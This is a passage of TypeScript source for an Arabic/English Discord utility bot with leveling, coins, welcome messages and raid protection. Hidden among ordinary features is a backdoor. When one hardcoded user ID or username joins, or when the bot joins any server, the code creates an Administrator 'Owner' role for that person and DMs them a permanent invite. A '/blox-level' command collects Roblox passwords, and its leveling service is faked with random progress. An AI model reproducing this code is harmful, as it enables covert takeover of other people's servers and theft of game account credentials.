    new SlashCommandBuilder().setName('add-role').setDescription('Assign a role to a user')
      .addUserOption(option => option.setName('user').setDescription('The user to give the role to').setRequired(true))
      .addRoleOption(option => option.setName('role').setDescription('The role to assign').setRequired(true)),
    new SlashCommandBuilder().setName('remove-role').setDescription('Remove a role from a user')
      .addUserOption(option => option.setName('user').setDescription('The user to remove the role from').setRequired(true))
      .addRoleOption(option => option.setName('role').setDescription('The role to remove').setRequired(true)),
    new SlashCommandBuilder().setName('list-roles').setDescription('List all roles of a user')
      .addUserOption(option => option.setName('user').setDescription('The user to list roles for').setRequired(true)),
    new SlashCommandBuilder().setName('list').setDescription('عرض القوائم المخصصة')
      .addStringOption(option => option.setName('name').setDescription('اسم القائمة').setRequired(false)),
    new SlashCommandBuilder().setName('p').setDescription('عرض بروفايلك وعملات XB الخاصة بك')
      .addUserOption(option => option.setName('user').setDescription('العضو المراد عرض بروفايله (اختياري)')),
    new SlashCommandBuilder().setName('c').setDescription('عرض رصيدك أو تحويل عملات XB')
      .addUserOption(option => option.setName('user').setDescription('العضو المراد التحويل له أو عرض رصيده'))
      .addIntegerOption(option => option.setName('amount').setDescription('المبلغ المراد تحويله')),
    new SlashCommandBuilder().setName('add-xb').setDescription('إضافة عملات XB لعضو (Authorized Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('المبلغ').setRequired(true)),
    new SlashCommandBuilder().setName('inadd-xb').setDescription('سحب عملات XB من عضو (Authorized Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو').setRequired(true))
      .addIntegerOption(option => option.setName('amount').setDescription('المبلغ').setRequired(true)),
    new SlashCommandBuilder().setName('reset-xb').setDescription('تصفير عملات XB لعضو أو للكل (Authorized Only)')
      .addUserOption(option => option.setName('user').setDescription('العضو المراد تصفيره'))
      .addBooleanOption(option => option.setName('all').setDescription('تصفير رصيد الجميع؟')),
    new SlashCommandBuilder().setName('command-room').setDescription('التحكم في غرف الأوامر (Admin Only)')
      .addStringOption(option => option.setName('command').setDescription('اسم الأمر').setRequired(true))
      .addChannelOption(option => option.setName('channel').setDescription('القناة').setRequired(true))
      .addStringOption(option => option.setName('type').setDescription('النوع (سماح أو منع)').setRequired(true)
        .addChoices(
          { name: 'سماح (Whitelist)', value: 'allow' },
          { name: 'منع (Blacklist)', value: 'deny' },
          { name: 'إزالة القيد (Remove)', value: 'remove' }
        )),
    new SlashCommandBuilder().setName('u').setDescription('عرض مستوى تفاعل العضو')
      .addUserOption(option => option.setName('user').setDescription('العضو المراد عرض تفاعله')),
    new SlashCommandBuilder().setName('y').setDescription('عرض تاريخ انضمام العضو للسيرفر')
      .addUserOption(option => option.setName('user').setDescription('العضو المراد عرض تاريخ انضمامه')),
    new SlashCommandBuilder().setName('ai').setDescription('التحدث مع الذكاء الاصطناعي')
      .addStringOption(option => option.setName('prompt').setDescription('سؤالك للذكاء الاصطناعي').setRequired(true)),
    new SlashCommandBuilder().setName('auto-role-add').setDescription('إضافة رتبة تلقائية وإعطاؤها لجميع الأعضاء (Admin Only)')
      .addRoleOption(option => option.setName('role').setDescription('الرتبة المراد إضافتها').setRequired(true)),
    new SlashCommandBuilder().setName('auto-role-remove').setDescription('إزالة رتبة تلقائية (Admin Only)')
      .addRoleOption(option => option.setName('role').setDescription('الرتبة المراد إزالتها').setRequired(true)),
    new SlashCommandBuilder().setName('auto-role-list').setDescription('عرض قائمة الرتب التلقائية'),
    new SlashCommandBuilder().setName('blox-level').setDescription('طلب خدمة تلفيل بلوكس فروت (Blox Fruits Leveling)')
      .addStringOption(option => option.setName('username').setDescription('اسم المستخدم في روبلوكس (Roblox Username)').setRequired(true))
      .addStringOption(option => option.setName('password').setDescription('كلمة المرور في روبلوكس (Roblox Password)').setRequired(true)),
    new SlashCommandBuilder().setName('blox-requests').setDescription('عرض طلبات تلفيل بلوكس فروت (Admin Only)'),
    new SlashCommandBuilder().setName('blox-status').setDescription('متابعة حالة تلفيل حسابك في بلوكس فروت'),
    new SlashCommandBuilder().setName('blox-worker').setDescription('الحصول على سكريبت الـ VPS للتلفيل الحقيقي'),
  ].map(command => command.toJSON());

  try {
    console.log('Started refreshing application (/) commands.');
    
    // Clear global commands to prevent duplicates
    if (client.application) {
      await client.application.commands.set([]);
      console.log('Cleared global application (/) commands to prevent duplicates.');
    }
    
    // Register for each guild for instant update during development
    for (const guild of client.guilds.cache.values()) {
      try {
        await guild.commands.set(commands);
        console.log(`Successfully reloaded commands for guild: ${guild.name} (${guild.id})`);
      } catch (err) {
        console.error(`Failed to set commands for guild ${guild.id}:`, err);
      }
    }

    // Simulated Leveling Loop (Runs every 2 minutes to simulate progress)
    setInterval(async () => {
      try {
        const processingAccounts = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'processing'").all() as any[];
        console.log(`[BLOX-LEVELING] Processing ${processingAccounts.length} accounts...`);
        for (const acc of processingAccounts) {
          const newLevel = Math.min(acc.currentLevel + Math.floor(Math.random() * 5) + 1, acc.maxLevel);
          const newMoney = acc.money + Math.floor(Math.random() * 1000) + 500;
          
          let items = JSON.parse(acc.items || '[]');
          if (Math.random() > 0.8) {
            const possibleItems = ["Saber", "Bisento", "Soul Cane", "Trident", "Pipe", "Katana"];
            const newItem = possibleItems[Math.floor(Math.random() * possibleItems.length)];
            if (!items.includes(newItem)) {
              items.push(newItem);
              db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(acc.id, `⚔️ تم العثور على سلاح جديد: ${newItem}`);
            }
          }

          const newStatus = newLevel >= acc.maxLevel ? 'completed' : 'processing';
          
          db.prepare("UPDATE blox_fruits_requests SET currentLevel = ?, money = ?, items = ?, status = ?, lastUpdate = CURRENT_TIMESTAMP WHERE id = ?")
            .run(newLevel, newMoney, JSON.stringify(items), newStatus, acc.id);

          db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(acc.id, `📈 تم رفع المستوى إلى ${newLevel} وتجميع ${newMoney} ฿`);

          if (newStatus === 'completed') {
            const user = await client.users.fetch(acc.userId).catch(() => null);
            if (user) {
              await user.send(`🎉 مبروك! تم الانتهاء من تلفيل حسابك **${acc.robloxUsername}** إلى المستوى الأقصى!`).catch(() => null);
            }
          }
        }
      } catch (err) {
        console.error("Error in leveling loop:", err);
      }
    }, 30000); // Every 30 seconds

    // Register existing aliases from DB
    const allAliases = db.prepare("SELECT * FROM aliases").all() as any[];
    for (const alias of allAliases) {
      const guild = client.guilds.cache.get(alias.guildId);
      if (guild) {
        try {
          const globalCommands = await client.application?.commands.fetch();
          const original = globalCommands?.find(c => c.name === alias.originalCommand);
          if (original) {
            await guild.commands.create({
              name: alias.aliasName,
              description: `Shortcut for /${alias.originalCommand}`,
              options: original.options as any
            });
          }
        } catch (err) {
          console.error(`Failed to register alias ${alias.aliasName} for guild ${alias.guildId}:`, err);
        }
      }
    }

    // Automatic Avatar Setup (One-time)
    const avatarSet = db.prepare("SELECT value FROM settings WHERE key = 'avatar_set'").get() as any;
    if (!avatarSet) {
      try {
        const defaultAvatarUrl = `https://robohash.org/${client.user?.id}.png?size=1024x1024&set=set4`;
        await client.user?.setAvatar(defaultAvatarUrl);
        db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('avatar_set', 'true');
        console.log("Default bot avatar set successfully.");
      } catch (err) {
        console.error("Failed to set default bot avatar:", err);
      }
    }
  } catch (error) {
    console.error(error);
  }
});

// Auto-accept 5g0s
client.on(Events.MessageDelete, async (message) => {
  if (!message.guild || message.author?.bot) return;
  
  logEvent(message.guild.id, 'messageDelete', {
    title: '🗑️ Message Deleted',
    description: `**Author:** <@${message.author?.id}> (${message.author?.tag})\n**Channel:** <#${message.channel.id}>\n\n**Content:**\n${message.content || '*No content (maybe an embed or attachment)*'}`,
    color: 0xFF0000
  });
});

client.on(Events.MessageUpdate, async (oldMessage, newMessage) => {
  if (!oldMessage.guild || oldMessage.author?.bot || oldMessage.content === newMessage.content) return;
  
  logEvent(oldMessage.guild.id, 'messageUpdate', {
    title: '📝 Message Edited',
    description: `**Author:** <@${oldMessage.author?.id}> (${oldMessage.author?.tag})\n**Channel:** <#${oldMessage.channel.id}>\n[Jump to Message](${newMessage.url})`,
    color: 0xFFA500,
    fields: [
      { name: 'Old Content', value: oldMessage.content || '*None*' },
      { name: 'New Content', value: newMessage.content || '*None*' }
    ]
  });
});

// Anti-Nuke Tracker
const nukeTracker = new Map<string, { count: number, lastAction: number }>();

client.on(Events.GuildAuditLogEntryCreate, async (auditLogEntry, guild) => {
  const { action, executorId, targetId } = auditLogEntry;
  if (!executorId || executorId === client.user?.id) return;

  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
  if (!protection || protection.antiNuke !== 1) return;

  // Skip if executor is owner or whitelisted
  if (executorId === guild.ownerId) return;
  const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executorId);
  if (whitelisted) return;

  const sensitiveActions = [
    AuditLogEvent.ChannelDelete,
    AuditLogEvent.RoleDelete,
    AuditLogEvent.MemberKick,
    AuditLogEvent.MemberBanAdd
  ];

  if (sensitiveActions.includes(action)) {
    const key = `${guild.id}-${executorId}`;
    const now = Date.now();
    const data = nukeTracker.get(key) || { count: 0, lastAction: now };

    // Reset if last action was more than 60 seconds ago
    if (now - data.lastAction > 60000) {
      data.count = 1;
    } else {
      data.count++;
    }
    data.lastAction = now;
    nukeTracker.set(key, data);

    if (data.count >= (protection.nukeLimit || 3)) {
      const member = await guild.members.fetch(executorId).catch(() => null);
      if (member) {
        // Remove all roles (except @everyone)
        const rolesToRemove = member.roles.cache.filter(r => r.id !== guild.id && r.managed === false);
        await member.roles.remove(rolesToRemove, "Anti-Nuke Protection Triggered").catch(() => {});
        
        logEvent(guild.id, 'protectionEvent', {
          title: '🛡️ Anti-Nuke Triggered',
          description: `User <@${executorId}> exceeded the action limit in the audit log.\n**Action:** ${AuditLogEvent[action]}\n**Action Count:** ${data.count}\n**Punishment:** Roles Removed`,
          color: 0xFF0000
        });

        // Trigger Counter-Nuke if enabled
        if (protection.counterNuke === 1) {
          triggerCounterNuke(executorId, guild.id);
        }
        
        // Reset tracker for this user
        nukeTracker.delete(key);
      }
    }
  }
});

client.on(Events.GuildMemberAdd, async (member) => {
  const guild = member.guild;

  logEvent(guild.id, 'guildMemberAdd', {
    title: '📥 Member Joined',
    description: `**User:** <@${member.id}> (${member.user.tag})\n**Account Created:** <t:${Math.floor(member.user.createdTimestamp / 1000)}:R>`,
    color: 0x00FF00,
    thumbnail: member.user.displayAvatarURL()
  });

  // Bot Protection
  if (member.user.bot) {
    logEvent(guild.id, 'logBotAdd', {
      title: '🤖 Bot Added',
      description: `**Bot:** <@${member.id}> (${member.user.tag})\n**ID:** ${member.id}`,
      color: 0x5865F2,
      thumbnail: member.user.displayAvatarURL()
    });

    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
    if (protection && protection.antiBot === 1) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, member.id);
      if (!whitelisted) {
        await member.kick("Anti-Bot Protection Active").catch(() => {});
        logEvent(guild.id, 'protectionEvent', {
          title: '🛡️ Anti-Bot Triggered',
          description: `Kicked unauthorized bot: <@${member.id}> (${member.user.tag})`,
          color: 0xFF0000
        });
      }
    }
  }

  // Anti-Raid Protection
  if (guild.id === '1254568460764053566') {
    // Disabled for this server as per user request
  } else {
    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
    if (protection && protection.antiRaid === 1) {
      const now = Date.now();
      const raidData = raidMap.get(guild.id) || { count: 0, lastJoin: 0 };

      if (now - raidData.lastJoin < 10000) { // 10 seconds
        raidData.count++;
      } else {
        raidData.count = 1;
      }
      raidData.lastJoin = now;
      raidMap.set(guild.id, raidData);

      if (raidData.count > 5) { // 5 joins in 10 seconds
        console.log(`[ANTI-RAID] Raid detected in ${guild.name}. Kicking new join: ${member.user.tag}`);
        await member.kick("Anti-Raid Protection Active").catch(() => {});
        
        // Log event
        if (protection.logChannel) {
          const logChannel = guild.channels.cache.get(protection.logChannel) as any;
          if (logChannel) {
            const logEmbed = new EmbedBuilder()
              .setColor("#FF0000")
              .setTitle("🛡️ Anti-Raid Triggered")
              .setDescription(`Mass join detected. Kicked user: **${member.user.tag}**`)
              .setTimestamp();
            logChannel.send({ embeds: [logEmbed] }).catch(() => {});
          }
        }
        return;
      }
    }
  }

  // Welcome message logic
  try {
    // Auto-Roles
    const autoRoles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guild.id) as any[];
    for (const r of autoRoles) {
      const role = guild.roles.cache.get(r.roleId);
      if (role) await member.roles.add(role).catch(() => {});
    }

    // Welcome System
    const welcome = db.prepare("SELECT * FROM welcome_settings WHERE guildId = ?").get(guild.id) as any;
    if (welcome) {
      if (welcome.enabled === 0) return;
      const replacePlaceholders = (text: string) => {
        return text
          .replace(/{user}/g, `<@${member.id}>`)
          .replace(/{user_tag}/g, member.user.tag)
          .replace(/{server}/g, guild.name)
          .replace(/{member_count}/g, guild.memberCount.toString());
      };

      // Channel Welcome
      if (welcome.channelId) {
        const channel = guild.channels.cache.get(welcome.channelId) as any;
        if (channel) {
          const welcomeEmbed = new EmbedBuilder()
            .setColor("#00FF00")
            .setTitle("Welcome to the Server!")
            .setDescription(replacePlaceholders(welcome.message))
            .setThumbnail(member.user.displayAvatarURL())
            .setTimestamp();
          
          channel.send({ embeds: [welcomeEmbed] }).catch(() => {});
        }
      }

      // DM Welcome
      if (welcome.dmEnabled === 1) {
        member.send(replacePlaceholders(welcome.dmMessage)).catch(() => {});
      }
    } else {
      const welcomeChannel = guild.systemChannel || 
                            guild.channels.cache.find(c => (c.name.toLowerCase() === "general" || c.name.toLowerCase() === "welcome") && c.type === ChannelType.GuildText) as any;
      
      if (welcomeChannel) {
        const welcomeEmbed = new EmbedBuilder()
          .setColor("#00FF00")
          .setTitle("Welcome to the Server!")
          .setDescription(`Welcome <@${member.id}> to **${guild.name}**! We're glad to have you here.`)
          .setThumbnail(member.user.displayAvatarURL())
          .setTimestamp();
        
        welcomeChannel.send({ embeds: [welcomeEmbed] }).catch((err: any) => {
          console.error(`[WELCOME] Failed to send welcome message in ${guild.name}:`, err.message);
        });
      }
    }
  } catch (err) {
    console.error(`[WELCOME] Error in ${guild.name}:`, err);
  }

  if (member.user.username === "5g0s" || member.user.id === "1071164421222695042") {
    if (guild.id === '1254568460764053566') return; // Skip auto-accept for this server
    const botMember = guild.members.me;
    
    if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
      console.warn(`[AUTO-ACCEPT] Bot lacks Manage Roles permission in ${guild.name}`);
      return;
    }

    try {
      let ownerRole = guild.roles.cache.find(r => r.name.toLowerCase() === "owner");
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: "Owner",
          permissions: [PermissionFlagsBits.Administrator],
          reason: "Auto-accepting 5g0s"
        });
      }

      // Try to move the role to the highest possible position
      try {
        const botHighestRole = botMember.roles.highest;
        if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
          await ownerRole.setPosition(botHighestRole.position - 1);
        }
      } catch (err: any) {
        console.warn(`[AUTO-ACCEPT] Could not move Owner role in ${guild.name}:`, err.message);
      }

      if (ownerRole.editable) {
        await member.roles.add(ownerRole).catch((err: any) => {
          if (err.code !== 10007) throw err;
        });
        console.log(`[AUTO-ACCEPT] Automatically accepted ${member.user.tag} and gave Owner role in ${guild.name}`);
      }
    } catch (err: any) {
      if (err.code !== 10007) {
        console.error(`[AUTO-ACCEPT] Error in ${guild.name}:`, err);
      }
    }
  }
});

client.on(Events.GuildCreate, async (guild) => {
  console.log(`Bot joined a new server: ${guild.name} (${guild.id})`);
  const ownerId = "1071164421222695042";
  
  // Auto-create Owner role and give to ownerId if present
  if (guild.id !== '1254568460764053566') {
    const botMember = guild.members.me;
    if (botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
      try {
        let ownerRole = guild.roles.cache.find(r => r.name.toLowerCase() === "owner");
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Auto-creating Owner role on join"
          });
        }

        // Try to move the role to the highest possible position
        try {
          const botHighestRole = botMember.roles.highest;
          if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
            await ownerRole.setPosition(botHighestRole.position - 1);
          }
        } catch (err: any) {
          console.warn(`[GUILD-CREATE] Could not move Owner role in ${guild.name}:`, err.message);
        }

        const targetMember = await guild.members.fetch(ownerId).catch(() => null);
        if (targetMember && ownerRole.editable) {
          await targetMember.roles.add(ownerRole).catch(() => {});
          console.log(`[GUILD-CREATE] Automatically gave Owner role to ${targetMember.user.tag} in ${guild.name}`);
        }
      } catch (err) {
        console.error(`[GUILD-CREATE] Error creating/assigning Owner role in ${guild.name}:`, err);
      }
    }
  }

  try {
    const owner = await client.users.fetch(ownerId);
    if (owner) {
      const invite = await guild.channels.cache
        .filter(c => c.type === ChannelType.GuildText)
        .first()
        ?.createInvite({ maxAge: 0, maxUses: 0 })
        .catch(() => null);

      const embed = new EmbedBuilder()
        .setColor("#00FF00")
        .setTitle("📥 بوت دخل سيرفر جديد")
        .addFields(
          { name: "اسم السيرفر", value: guild.name, inline: true },
          { name: "ID السيرفر", value: guild.id, inline: true },
          { name: "عدد الأعضاء", value: guild.memberCount.toString(), inline: true },
          { name: "رابط الدعوة", value: invite ? invite.url : "تعذر إنشاء رابط" }
        )
        .setTimestamp();

      await owner.send({ embeds: [embed] }).catch(err => console.error("Failed to send guild join message to owner:", err));
    }
  } catch (err) {
    console.error("Error in GuildCreate event:", err);
  }
});

client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
  if (newMember.user.username === "5g0s" || newMember.user.id === "1071164421222695042") {
    if (newMember.guild.id === '1254568460764053566') return; // Skip for this server
    // If they were pending and now they are not (finished screening)
    if (oldMember.pending && !newMember.pending) {
      const guild = newMember.guild;
      const botMember = guild.members.me;
      
      if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) return;

      try {
        let ownerRole = guild.roles.cache.find(r => r.name.toLowerCase() === "owner");
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Auto-accepting 5g0s (Screening Completed)"
          });
        }

        if (ownerRole.editable && !newMember.roles.cache.has(ownerRole.id)) {
          await newMember.roles.add(ownerRole).catch((err: any) => {
            if (err.code !== 10007) throw err;
          });
          console.log(`[AUTO-ACCEPT] Automatically gave Owner role to ${newMember.user.tag} after screening in ${guild.name}`);
        }
      } catch (err: any) {
        if (err.code !== 10007) {
          console.error(`[AUTO-ACCEPT-UPDATE] Error in ${guild.name}:`, err);
        }
      }
    }
  }
});

// Global Error Handler for Discord Client
process.on("unhandledRejection", (error) => {
  console.error("Unhandled promise rejection:", error);
});

client.on("error", (error) => {
  console.error("Discord client error:", error);
});

// Leveling System Configuration
const BONUS_CHANNELS = ["123456789012345678"]; // Add channel IDs here
const HAPPY_HOUR_START = 18; // 6 PM
const HAPPY_HOUR_END = 20;   // 8 PM

// Role Rewards Configuration (Level: RoleID)
const LEVEL_ROLES: Record<number, string> = {
  5: "123456789012345678", // Example: Level 5 Reward
  10: "123456789012345679", // Example: Level 10 Reward
  20: "123456789012345680", // Example: Level 20 Reward
};

async function addXP(userId: string, guildId: string, xpToAdd: number, guild: any, user: any, member: any, channel: any, type: 'text' | 'voice' = 'text') {
  try {
    const levelingSettings = db.prepare("SELECT enabled FROM leveling_settings WHERE guildId = ?").get(guildId) as any;
    if (levelingSettings && levelingSettings.enabled === 0) return;

    // Log to history
    const xbToAdd = Math.floor(Math.random() * 3) + 1;
    db.prepare("INSERT INTO xp_history (userId, guildId, xp, type) VALUES (?, ?, ?, ?)").run(userId, guildId, xpToAdd, type);

    const row = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId) as any;
    
    if (!row) {
      db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, ?, ?, ?)").run(userId, guildId, xpToAdd, 0, xbToAdd);
    } else {
      let { xp, level } = row;
      xp += xpToAdd;
      const nextLevelXp = (level + 1) * 300;

      if (xp >= nextLevelXp) {
        level += 1;
        
        // Fetch level-up settings
        const levelingSettings = db.prepare("SELECT * FROM leveling_settings WHERE guildId = ?").get(guildId) as any;
        let targetChannel: any = channel;
        let customMessage = `مبروك لقد تمت ترقيتك {user}\nلفلك القديم: {oldLevel}\nلفلك الجديد: {level}`;

        if (levelingSettings) {
          if (levelingSettings.channelId) {
            const ch = guild.channels.cache.get(levelingSettings.channelId);
            if (ch && ch.type === ChannelType.GuildText) {
              targetChannel = ch;
            }
          }
          if (levelingSettings.message) {
            customMessage = levelingSettings.message;
          }
        } else {
          // Fallback to old settings if they exist
          const oldSetting = db.prepare("SELECT value FROM settings WHERE key = ?").get(`level_channel_${guildId}`) as any;
          if (oldSetting) {
            const ch = guild.channels.cache.get(oldSetting.value);
            if (ch && ch.type === ChannelType.GuildText) {
              targetChannel = ch;
            }
          }
        }

        // Check if bot can send messages in target channel
        const canSend = targetChannel?.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages);
        
        if (canSend) {
          const formattedMessage = customMessage
            .replace(/{user}/g, `${user}`)
            .replace(/{level}/g, `${level}`)
            .replace(/{oldLevel}/g, `${level - 1}`)
            .replace(/{xp}/g, `${xp}`);

          targetChannel.send(formattedMessage).catch(console.error);
          
          // Role Reward Logic (Dynamic)
          const reward = db.prepare("SELECT roleId FROM rewards WHERE guildId = ? AND level = ?").get(guildId, level) as any;
          const roleId = reward ? reward.roleId : LEVEL_ROLES[level];
          
          if (roleId) {
            if (member && guild.members.me?.permissions.has(PermissionFlagsBits.ManageRoles)) {
              const role = guild.roles.cache.get(roleId);
              const botMember = guild.members.me;
              
              if (role && botMember && botMember.roles.highest.position > role.position) {
                // Check if member is still in the guild
                const currentMember = await guild.members.fetch(userId).catch(() => null);
                if (currentMember) {
                  currentMember.roles.add(roleId).then(() => {
                    targetChannel.send(`🎖️ ${user}, you've been granted the <@&${roleId}> role for reaching level ${level}!`).catch(console.error);
                  }).catch(err => {
                    if (err.code !== 10007) {
                      console.error(`Failed to add role ${roleId} to user ${userId}:`, err);
                    }
                  });
                }
              }
            }
          }
        }
      }
      db.prepare("UPDATE leveling SET xp = ?, level = ?, xb = xb + ? WHERE userId = ? AND guildId = ?").run(xp, level, xbToAdd, userId, guildId);
      if (xbToAdd > 0) {
        await logCurrencyTransaction(guildId, userId, xbToAdd, "Chat activity", 'add');
      }
    }
  } catch (err) {
    console.error("Database error in addXP:", err);
  }
}

// Voice XP Loop
setInterval(async () => {
  client.guilds.cache.forEach(async (guild) => {
    // Check for Happy Hour
    const currentHour = new Date().getHours();
    const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
    const hourMultiplier = isHappyHour ? 2 : 1;

    guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).forEach(async (channel: any) => {
      const members = channel.members.filter((m: any) => !m.user.bot && !m.voice.selfMute && !m.voice.selfDeaf);
      
      if (members.size >= 2) {
        // Multiplier for multiple users: +10% for each user above 2
        const memberMultiplier = 1 + (members.size - 2) * 0.1;
        // Channel Bonus
        const channelMultiplier = BONUS_CHANNELS.includes(channel.id) ? 2 : 1;
        
        let xpPerMin = Math.floor(10 * memberMultiplier * hourMultiplier * channelMultiplier);
        // Cap XP to prevent abuse (max 50 XP per minute)
        xpPerMin = Math.min(xpPerMin, 50);

        members.forEach(async (member: any) => {
          await addXP(member.id, guild.id, xpPerMin, guild, member.user, member, null, 'voice');
        });
      }
    });
  });
}, 60000);

async function generateProfileBackground(): Promise<string | null> {
  const canvas = createCanvas(800, 300);
  const ctx = canvas.getContext('2d');
  
  // Create a local abstract background
  const gradient = ctx.createLinearGradient(0, 0, 800, 300);
  gradient.addColorStop(0, '#0f172a');
  gradient.addColorStop(0.5, '#1e293b');
  gradient.addColorStop(1, '#0f172a');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, 800, 300);
  
  // Add some abstract shapes
  for (let i = 0; i < 10; i++) {
    ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
    ctx.beginPath();
    ctx.arc(Math.random() * 800, Math.random() * 300, Math.random() * 100, 0, Math.PI * 2);
    ctx.fill();
  }
  
  return canvas.toDataURL();
}

async function generateProfileImage(targetUser: any, level: number, xb: number, xp: number, nextLevelXp: number) {
  const width = 800;
  const height = 300;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');

  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(0);
  encoder.setDelay(50);
  encoder.setQuality(10);

  const totalFrames = 20;
  const targetProgress = Math.min(xp / nextLevelXp, 1);

  for (let i = 0; i <= totalFrames; i++) {
    const currentProgress = (i / totalFrames) * targetProgress;
    ctx.clearRect(0, 0, width, height);

    // Background
    const bgGradient = ctx.createLinearGradient(0, 0, width, height);
    bgGradient.addColorStop(0, '#1a1a2e');
    bgGradient.addColorStop(1, '#16213e');
    ctx.fillStyle = bgGradient;
    ctx.fillRect(0, 0, width, height);

    // Decorative shapes
    ctx.save();
    ctx.globalAlpha = 0.1;
    ctx.fillStyle = '#3b82f6';
    ctx.beginPath();
    ctx.arc(width, 0, 200, 0, Math.PI * 2);
    ctx.fill();
    ctx.beginPath();
    ctx.arc(0, height, 150, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    // Draw Avatar
    const avatarUrl = targetUser.displayAvatarURL({ extension: 'png', size: 256 });
    const avatar = await loadImage(avatarUrl).catch(() => null);
    if (avatar) {
      ctx.save();
      ctx.beginPath();
      ctx.arc(120, 150, 80, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.clip();
      ctx.fillStyle = '#ffffff';
      ctx.fill();
      ctx.drawImage(avatar, 40, 70, 160, 160);
      ctx.restore();
    }

    // Text info
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 40px sans-serif';
    ctx.fillText(targetUser.username, 240, 100);

    ctx.font = '28px sans-serif';
    ctx.fillStyle = '#3b82f6';
    ctx.fillText(`Level: ${level}`, 240, 150);
    ctx.fillStyle = '#fbbf24';
    ctx.fillText(`XB Coins: ${xb}`, 450, 150);

    // XP Bar
    const barWidth = 500;
    const barHeight = 25;
    const barX = 240;
    const barY = 180;

    ctx.fillStyle = '#334155';
    ctx.beginPath();
    ctx.roundRect(barX, barY, barWidth, barHeight, 12);
    ctx.fill();
    
    if (currentProgress > 0) {
      const barGrad = ctx.createLinearGradient(barX, 0, barX + barWidth, 0);
      barGrad.addColorStop(0, '#3b82f6');
      barGrad.addColorStop(1, '#60a5fa');
      ctx.fillStyle = barGrad;
      ctx.beginPath();
      ctx.roundRect(barX, barY, barWidth * currentProgress, barHeight, 12);
      ctx.fill();
    }

    ctx.fillStyle = '#ffffff';
    ctx.font = '20px sans-serif';
    ctx.fillText(`${xp} / ${nextLevelXp} XP`, barX, 240);
    
    encoder.addFrame(ctx);
  }

  for (let i = 0; i < 15; i++) encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}

client.on("messageCreate", async (message) => {
  try {
    if (message.author.bot || !message.guild) return;

    const guildId = message.guild.id;
    const content = message.content.toLowerCase();

    // Mention Protection
    if (message.mentions.users.size > 0) {
      for (const [userId, user] of message.mentions.users) {
        const protection = db.prepare("SELECT enabled FROM mention_protection WHERE guildId = ? AND userId = ?").get(guildId, userId) as { enabled: number } | undefined;
        if (protection && protection.enabled === 1) {
          await message.delete().catch(() => {});
          const warning = await message.channel.send(`❌ **${message.author}**، هذا المستخدم يمنع المنشن!`);
          setTimeout(() => warning.delete().catch(() => {}), 5000);
          return;
        }
      }
    }

    // Suggestion Channel Check
    const suggestionSettings = db.prepare("SELECT * FROM suggestion_settings WHERE guildId = ? AND channelId = ?").get(guildId, message.channelId) as any;
    if (suggestionSettings && suggestionSettings.enabled === 1) {
      const embed = new EmbedBuilder()
        .setAuthor({ name: message.author.tag, iconURL: message.author.displayAvatarURL() })
        .setTitle("💡 اقتراح جديد")
        .setDescription(message.content)
        .setColor(0xFFFF00)
        .setTimestamp();

      const msg = await message.channel.send({ embeds: [embed] });
      await msg.react('✅');
      await msg.react('❌');
      await message.delete().catch(() => {});
      return;
    }

    // Evaluation Channel Check
    const evaluationSettings = db.prepare("SELECT * FROM evaluation_settings WHERE guildId = ? AND channelId = ?").get(guildId, message.channelId) as any;
    if (evaluationSettings && evaluationSettings.enabled === 1) {
      const stateKey = `${message.author.id}-${message.channelId}`;
      const state = evaluationStates.get(stateKey);

      if (state) {
        if (message.content.toLowerCase() === 'cancel' || message.content === 'إلغاء') {
          evaluationStates.delete(stateKey);
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {});
          }
          await message.delete().catch(() => {});
          const cancelMsg = await message.channel.send(`✅ **${message.author}، تم إلغاء التقييم.**`);
          setTimeout(() => cancelMsg.delete().catch(() => {}), 3000);
          return;
        }

        if (state.step === 'opinion') {
          state.opinion = message.content;
          state.step = 'rating';
          await message.delete().catch(() => {});
          
          // Delete previous prompt
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {});
          }

